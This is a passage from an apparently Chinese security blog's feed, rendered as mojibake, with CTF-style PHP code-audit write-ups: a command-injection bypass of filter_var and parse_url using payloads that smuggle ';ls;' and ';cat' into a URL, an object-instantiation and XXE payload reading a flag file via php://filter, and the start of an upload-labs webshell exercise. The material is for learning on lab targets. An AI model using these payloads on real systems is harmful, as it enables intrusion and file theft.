<strong><code>PHP_URL_SCHEME</code></strong>ã€ <strong><code>PHP_URL_HOST</code></strong>ã€ <strong><code>PHP_URL_PORT</code></strong>ã€ <strong><code>PHP_URL_USER</code></strong>ã€ <strong><code>PHP_URL_PASS</code></strong>ã€ <strong><code>PHP_URL_PATH</code></strong>ã€ <strong><code>PHP_URL_QUERY</code></strong> æˆ– <strong><code>PHP_URL_FRAGMENT</code></strong> çš„å…¶ä¸­ä¸€ä¸ªæ¥è·å– URL ä¸­æŒ‡å®šçš„éƒ¨åˆ†çš„ <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>ã€‚ ï¼ˆé™¤äº†æŒ‡å®šä¸º <strong><code>PHP_URL_PORT</code></strong> åï¼Œå°†è¿”å›ä¸€ä¸ª <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> çš„å€¼ï¼‰ã€‚</p></li></ul><p><strong>è¿”å›å€¼</strong></p><p>å¯¹ä¸¥é‡ä¸åˆæ ¼çš„ URLï¼Œ<strong>parse_url()</strong> å¯èƒ½ä¼šè¿”å› <strong><code>FALSE</code></strong>ã€‚</p><p>å¦‚æœçœç•¥äº† <code>component</code> å‚æ•°ï¼Œå°†è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>ï¼Œåœ¨ç›®å‰è‡³å°‘ä¼šæœ‰ä¸€ä¸ªå…ƒç´ åœ¨è¯¥æ•°ç»„ä¸­ã€‚æ•°ç»„ä¸­å¯èƒ½çš„é”®æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>scheme - å¦‚ http</li><li>host</li><li>port</li><li>user</li><li>pass</li><li>path</li><li>query - åœ¨é—®å· <em>?</em> ä¹‹å</li><li>fragment - åœ¨æ•£åˆ—ç¬¦å· <em>#</em> ä¹‹å</li></ul><p>å¦‚æœæŒ‡å®šäº† <code>component</code> å‚æ•°ï¼Œ <strong>parse_url()</strong> è¿”å›ä¸€ä¸ª <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> ï¼ˆæˆ–åœ¨æŒ‡å®šä¸º <strong><code>PHP_URL_PORT</code></strong> æ—¶è¿”å›ä¸€ä¸ª <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>ï¼‰è€Œä¸æ˜¯ <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>ã€‚å¦‚æœ URL ä¸­æŒ‡å®šçš„ç»„æˆéƒ¨åˆ†ä¸å­˜åœ¨ï¼Œå°†ä¼šè¿”å› <strong><code>NULL</code></strong>ã€‚</p><blockquote><p>å‚è€ƒï¼š<a href="https://www.php.net/parse_url" target="_blank" rel="noopener">PHPæ‰‹å†Œ</a></p></blockquote><p>+++</p><ol start="3"><li>preg_match</li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>preg_match â€” æ‰§è¡ŒåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼</p><p><strong>è¯´æ˜</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match ( string `$pattern` , string `$subject` [, <span class="keyword">array</span> `&amp;$matches` [, int `$flags` = <span class="number">0</span> [, int `$offset` = <span class="number">0</span> ]]] ) : int</span><br></pre></td></tr></table></figure><p>   æœç´¢<code>subject</code>ä¸<code>pattern</code>ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªåŒ¹é….</p><p>+++</p><ol start="4"><li><strong>implode</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>   implode â€” å°†ä¸€ä¸ªä¸€ç»´æ•°ç»„çš„å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p><p><strong>è¯´æ˜</strong></p><p>   implode ( string <code>$glue</code> , array <code>$pieces</code> ) : string</p><p>   implode ( array <code>$pieces</code> ) : string</p><p>   ç”¨ <code>glue</code> å°†ä¸€ç»´æ•°ç»„çš„å€¼è¿æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><blockquote><p><strong>Note</strong>:<br>å› ä¸ºå†å²åŸå› ï¼Œ<strong>implode()</strong> å¯ä»¥æ¥æ”¶ä¸¤ç§å‚æ•°é¡ºåºï¼Œä½†æ˜¯ <a href="https://www.php.net/manual/zh/function.explode.php" target="_blank" rel="noopener">explode()</a> ä¸è¡Œã€‚ä¸è¿‡æŒ‰æ–‡æ¡£ä¸­çš„é¡ºåºå¯ä»¥é¿å…æ··æ·†ã€‚</p></blockquote><p>+++</p><h4 id="åˆ†æï¼š-1"><a href="#åˆ†æï¼š-1" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h4><p>é€šè¿‡GETæ–¹å¼å¾—åˆ°urlï¼Œå¹¶éšåç»è¿‡filter_varå’Œparse_urlå‡½æ•°è¿‡æ»¤å°†å€¼ä¼ ç»™å˜é‡$site_infoã€‚ç¨‹åºä½¿ç”¨ <strong>exec</strong> å‡½æ•°æ¥æ‰§è¡Œ <strong>curl</strong> å‘½ä»¤ï¼Œè§„å®šå½“ <strong>url</strong> å‚æ•°çš„å€¼ä»¥ <strong>sec-redclub.com</strong> ç»“å°¾æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œ <strong>exec</strong> å‡½æ•°ã€‚</p><p>é¦–å…ˆæ„é€ payloadç»•è¿‡ç»•è¿‡ <strong>filter_var</strong> çš„ <strong>FILTER_VALIDATE_URL</strong> è¿‡æ»¤å™¨;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=demo://demo.com,sec-redclub.com</span><br><span class="line">OR</span><br><span class="line">http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><p>ç»•è¿‡ <strong>parse_url</strong> å‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³ <strong>$site_info[â€˜hostâ€™]</strong> çš„å€¼ä»¥ <strong>sec-redclub.com</strong> ç»“å°¾ï¼Œpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒ<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">ç»•è¿‡æ–¹æ³•</a></p></blockquote><p>å½“æˆ‘ä»¬ç›´æ¥ç”¨ <strong>cat f1agi3hEre.php</strong> å‘½ä»¤çš„æ—¶å€™ï¼Œè¿‡ä¸äº† <strong>filter_var</strong> å‡½æ•°æ£€æµ‹ï¼Œå› ä¸ºåŒ…å«ç©ºæ ¼ï¼Œå…·ä½“payloadå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><p>+++</p><h2 id="çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day3-å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´"><a href="#çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day3-å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´" class="headerlink" title="[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day3 -å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´"></a>[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day3 -å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´</h2><h3 id="é¢˜ç›®ï¼š-1"><a href="#é¢˜ç›®ï¼š-1" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'404'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">($class)</span></span>&#123;</span><br><span class="line"><span class="keyword">new</span> NotFound();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line">$classname = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? $_GET[<span class="string">'name'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param = <span class="keyword">isset</span>($_GET[<span class="string">'param'</span>]) ? $_GET[<span class="string">'param'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param2 = <span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]) ? $_GET[<span class="string">'param2'</span>] : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">$newclass = <span class="keyword">new</span> $classname($param,$param2);</span><br><span class="line">var_dump($newclass);</span><br><span class="line">    <span class="keyword">foreach</span> ($newclass <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">        <span class="keyword">echo</span> $key.<span class="string">'=&gt;'</span>.$value.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>+++</p><p>è¡¥å……ï¼š</p><ol><li><p><strong>__construct()</strong> </p><p>__construct() å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ SimpleXMLElement å¯¹è±¡ã€‚</p><p>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p></li></ol><p>+++</p><ol start="2"><li><strong>class_exists</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>class_exists â€” æ£€æŸ¥ç±»æ˜¯å¦å·²å®šä¹‰</p><p><strong>è¯´æ˜</strong></p><p>class_exists ( string <code>$class_name</code> [, bool <code>$autoload</code> = true ] ) : bool</p><p>æ£€æŸ¥æŒ‡å®šçš„ç±»æ˜¯å¦å·²å®šä¹‰ã€‚</p><p><strong>å‚æ•°</strong></p><ul><li><p><code>class_name</code></p><p>ç±»åã€‚åå­—çš„åŒ¹é…æ˜¯ä¸åˆ†åŒºå¤§å°å†™çš„ã€‚</p></li><li><p><code>autoload</code></p><p>æ˜¯å¦é»˜è®¤è°ƒç”¨ <a href="https://www.php.net/manual/zh/language.oop5.autoload.php" target="_blank" rel="noopener">__autoload</a>ã€‚</p></li></ul><p><strong>è¿”å›å€¼</strong></p><p>å¦‚æœç”± <code>class_name</code> æ‰€æŒ‡çš„ç±»å·²ç»å®šä¹‰ï¼Œæ­¤å‡½æ•°è¿”å› <strong><code>TRUE</code></strong>ï¼Œå¦åˆ™è¿”å› <strong><code>FALSE</code></strong>ã€‚</p><p>+++</p><ol start="3"><li><strong>var_dump</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>var_dump â€” æ‰“å°å˜é‡çš„ç›¸å…³ä¿¡æ¯</p><p><strong>è¯´æ˜</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump ( mixed $expression [, mixed $... ] ) : void</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚</p><p>In PHP 5 all public, private and protected properties of objects will be returned in the output.</p><p><strong>Tip</strong></p><p>å’Œç›´æ¥å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨ä¸€æ ·ï¼Œå¯ä½¿ç”¨<a href="https://www.php.net/manual/zh/book.outcontrol.php" target="_blank" rel="noopener">è¾“å‡ºæ§åˆ¶å‡½æ•°</a>æ¥æ•è·å½“å‰å‡½æ•°çš„è¾“å‡ºï¼Œç„¶å(ä¾‹å¦‚)ä¿å­˜åˆ°ä¸€ä¸ª <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> ä¸­ã€‚</p><p><strong>å‚æ•°</strong></p><ul><li><p><code>expression</code></p><p>ä½ è¦æ‰“å°çš„å˜é‡ã€‚</p></li></ul><p>+++</p><ol start="4"><li><strong><em>foreach</em></strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p><em>foreach</em> è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚<em>foreach</em> ä»…èƒ½å¤Ÿåº”ç”¨äºæ•°ç»„å’Œå¯¹è±¡ï¼Œå¦‚æœå°è¯•åº”ç”¨äºå…¶ä»–æ•°æ®ç±»å‹çš„å˜é‡ï¼Œæˆ–è€…æœªåˆå§‹åŒ–çš„å˜é‡å°†å‘å‡ºé”™è¯¯ä¿¡æ¯ã€‚æœ‰ä¸¤ç§è¯­æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç§æ ¼å¼éå†ç»™å®šçš„ <em>array_expression</em> æ•°ç»„ã€‚æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ <em>$value</em> å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ï¼ˆå› æ­¤ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å°†ä¼šå¾—åˆ°ä¸‹ä¸€ä¸ªå•å…ƒï¼‰ã€‚</p><p>ç¬¬äºŒç§æ ¼å¼åšåŒæ ·çš„äº‹ï¼Œåªé™¤äº†å½“å‰å•å…ƒçš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ <em>$key</em>ã€‚</p><p>è¿˜èƒ½å¤Ÿè‡ªå®šä¹‰<a href="https://www.php.net/manual/zh/language.oop5.iterations.php" target="_blank" rel="noopener">éå†å¯¹è±¡</a>ã€‚</p><p>+++</p><ol start="5"><li><strong>spl_autoload_register</strong></li></ol><p>(PHP 5 &gt;= 5.1.0, PHP 7)</p><p>spl_autoload_register â€” æ³¨å†Œç»™å®šçš„å‡½æ•°ä½œä¸º __autoload çš„å®ç°</p><p><strong>è¯´æ˜</strong></p><p>spl_autoload_register ([ <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> <code>$autoload_function</code> [, bool <code>$throw</code> = true [, bool <code>$prepend</code> = false ]]] ) : bool</p><p>å°†å‡½æ•°æ³¨å†Œåˆ°SPL __autoloadå‡½æ•°é˜Ÿåˆ—ä¸­ã€‚å¦‚æœè¯¥é˜Ÿåˆ—ä¸­çš„å‡½æ•°å°šæœªæ¿€æ´»ï¼Œåˆ™æ¿€æ´»å®ƒä»¬ã€‚</p><p>å¦‚æœåœ¨ä½ çš„ç¨‹åºä¸­å·²ç»å®ç°äº†<a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>å‡½æ•°ï¼Œå®ƒå¿…é¡»æ˜¾å¼æ³¨å†Œåˆ°<a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>é˜Ÿåˆ—ä¸­ã€‚å› ä¸º <strong>spl_autoload_register()</strong>å‡½æ•°ä¼šå°†Zend Engineä¸­çš„<a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>å‡½æ•°å–ä»£ä¸º<a href="https://www.php.net/manual/zh/function.spl-autoload.php" target="_blank" rel="noopener">spl_autoload()</a>æˆ–<a href="https://www.php.net/manual/zh/function.spl-autoload-call.php" target="_blank" rel="noopener">spl_autoload_call()</a>ã€‚</p><p>å¦‚æœéœ€è¦å¤šæ¡ autoload å‡½æ•°ï¼Œ<strong>spl_autoload_register()</strong> æ»¡è¶³äº†æ­¤ç±»éœ€æ±‚ã€‚ å®ƒå®é™…ä¸Šåˆ›å»ºäº† autoload å‡½æ•°çš„é˜Ÿåˆ—ï¼ŒæŒ‰å®šä¹‰æ—¶çš„é¡ºåºé€ä¸ªæ‰§è¡Œã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œ <a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a> åªå¯ä»¥å®šä¹‰ä¸€æ¬¡ã€‚</p><p><strong>å‚æ•°</strong></p><ul><li><p><code>autoload_function</code></p><p>æ¬²æ³¨å†Œçš„è‡ªåŠ¨è£…è½½å‡½æ•°ã€‚å¦‚æœæ²¡æœ‰æä¾›ä»»ä½•å‚æ•°ï¼Œåˆ™è‡ªåŠ¨æ³¨å†Œ autoload çš„é»˜è®¤å®ç°å‡½æ•°<a href="https://www.php.net/manual/zh/function.spl-autoload.php" target="_blank" rel="noopener">spl_autoload()</a>ã€‚</p></li><li><p><code>throw</code></p><p>æ­¤å‚æ•°è®¾ç½®äº† <code>autoload_function</code> æ— æ³•æˆåŠŸæ³¨å†Œæ—¶ï¼Œ <strong>spl_autoload_register()</strong>æ˜¯å¦æŠ›å‡ºå¼‚å¸¸ã€‚</p></li><li><p><code>prepend</code></p><p>å¦‚æœæ˜¯ trueï¼Œ<strong>spl_autoload_register()</strong> ä¼šæ·»åŠ å‡½æ•°åˆ°é˜Ÿåˆ—ä¹‹é¦–ï¼Œè€Œä¸æ˜¯é˜Ÿåˆ—å°¾éƒ¨ã€‚</p></li></ul><p><strong>è¿”å›å€¼</strong></p><p>æˆåŠŸæ—¶è¿”å› <strong><code>TRUE</code></strong>ï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› <strong><code>FALSE</code></strong>ã€‚</p><p>+++</p><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong></p><ul><li>å®ä¾‹åŒ–æ¼æ´</li><li>XXEæ¼æ´</li></ul><p>+++</p><h5 id="åˆ†æï¼š-2"><a href="#åˆ†æï¼š-2" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h5><p>ä½¿ç”¨ <strong>class_exists</strong> å‡½æ•°æ¥åˆ¤æ–­ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ <strong>__autoload</strong> å‡½æ•°ï¼Œè€Œæ˜¯ç”¨ <strong>spl_autoload_register</strong> æ³¨å†Œäº†ä¸€ä¸ªç±»ä¼¼ <strong>__autoload</strong> ä½œç”¨çš„å‡½æ•°ï¼Œè°ƒç”¨ä¹‹å‰å®šä¹‰çš„<strong>NotFound</strong>å‡½æ•°è¾“å‡º404ä¿¡æ¯ã€‚</p><p>è¿™é‡Œç›´æ¥åˆ©ç”¨PHPçš„å†…ç½®ç±»ï¼Œå…ˆç”¨ <strong>GlobIterator</strong> ç±»æœç´¢ <strong>flagæ–‡ä»¶</strong> åå­—ï¼Œæ¥çœ‹ä¸€ä¸‹PHPæ‰‹å†Œå¯¹ <strong>GlobIterator</strong> ç±»çš„ æ„é€ å‡½æ•°çš„å®šä¹‰ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/10/Y34UFH.png" alt="Y34UFH.png"><br>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æœç´¢çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ªä¿¡æ¯ä½œä¸ºé”®åï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç”¨ <strong>FilesystemIterator::CURRENT_AS_FILEINFO</strong> ï¼Œå…¶å¯¹åº”çš„å¸¸é‡å€¼ä¸º0.</p><p>æ„é€ æœç´¢æ–‡ä»¶çš„payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘ç°ï¼Œflagçš„æ–‡ä»¶åä¸º <strong>f1agi3hEre.php</strong> ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨å†…ç½®ç±» <strong>SimpleXMLElement</strong> è¯»å– <strong>f1agi3hEre.php</strong> æ–‡ä»¶çš„å†…å®¹,ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ç»“åˆä½¿ç”¨PHPæµçš„ä½¿ç”¨ï¼Œå› ä¸ºå½“æ–‡ä»¶ä¸­å­˜åœ¨ï¼š <strong>&lt;   &gt;   &amp;   â€˜   â€œ</strong> è¿™5ä¸ªç¬¦å·æ—¶ï¼Œä¼šå¯¼è‡´XMLæ–‡ä»¶è§£æé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨PHPæ–‡ä»¶æµï¼Œå°†è¦è¯»å–çš„æ–‡ä»¶å†…å®¹ç»è¿‡ <strong>base64ç¼–ç </strong> åè¾“å‡ºå³å¯ï¼›</p><p>æ„é€ payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=<span class="string">"1.0"</span>?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php"</span>&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day1-in-arrayå‡½æ•°ç¼ºé™·&quot;&gt;&lt;a href=&quot;#çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day1-in-arrayå‡½æ•°ç¼ºé™·&quot; class=&quot;headerlink&quot; title=&quot;[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day1 - in_arrayå‡½æ•°ç¼ºé™·&quot;&gt;&lt;/a&gt;[çº¢æ—¥å®‰å…¨
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHPä»£ç å®¡è®¡å®ä¾‹</title>
    <link href="https://singlemindedt.github.io/2020/04/29/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E4%BE%8B/"/>
    <id>https://singlemindedt.github.io/2020/04/29/PHPä»£ç å®¡è®¡å®ä¾‹/</id>
    <published>2020-04-29T06:42:31.000Z</published>
    <updated>2020-05-07T02:12:58.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p><img src="https://s1.ax1x.com/2020/05/02/JvJadS.png" alt="JvJadS.png"></p><p><img src="https://s1.ax1x.com/2020/05/02/JvJYsP.png" alt="JvJYsP.png"></p><p>+++</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><img src="https://s1.ax1x.com/2020/05/02/JvJJMt.png" alt="JvJJMt.png"></p><p>å¦‚å›¾ï¼Œè¦æ±‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨ï¼Œå¹¶è¦æ±‚æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡ï¼›</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬ä¸Šä¼ ä»»æ„æ–‡ä»¶è¯•è¯•ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJ8xI.png" alt="JvJ8xI.png"></p><p>æç¤ºæˆ‘ä»¬ï¼Œ<strong>åªèƒ½ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶</strong>ï¼›</p><p>æŸ¥çœ‹æç¤ºï¼Œâ€œæœ¬passåœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼â€ï¼›</p><p>æç¤ºå·²ç»å¾ˆæ˜ç¡®äº†ï¼Œè¯¥é¢˜ç›®åœ¨å®¢æˆ·ç«¯ä½¿ç”¨jsè¿‡æ»¤ä¸åˆæ³•åç¼€ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šä¼ æ—¶å°†æ–‡ä»¶æ”¹ä¸ºåˆæ³•åç¼€æ ¼å¼ï¼Œç„¶åæŠ“åŒ…ï¼Œå†æ”¹åŒ…ï¼›</p><p>çœ‹çœ‹æºç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> + allow_ext + <span class="string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>å®¢æˆ·ç«¯jsç™½åå•æ£€æŸ¥</strong>;æ ¹æ®ä¸Šä¼ æ–‡ä»¶çš„åç¼€æ˜¯å¦ä¸º.jpg|.png|.gifæ 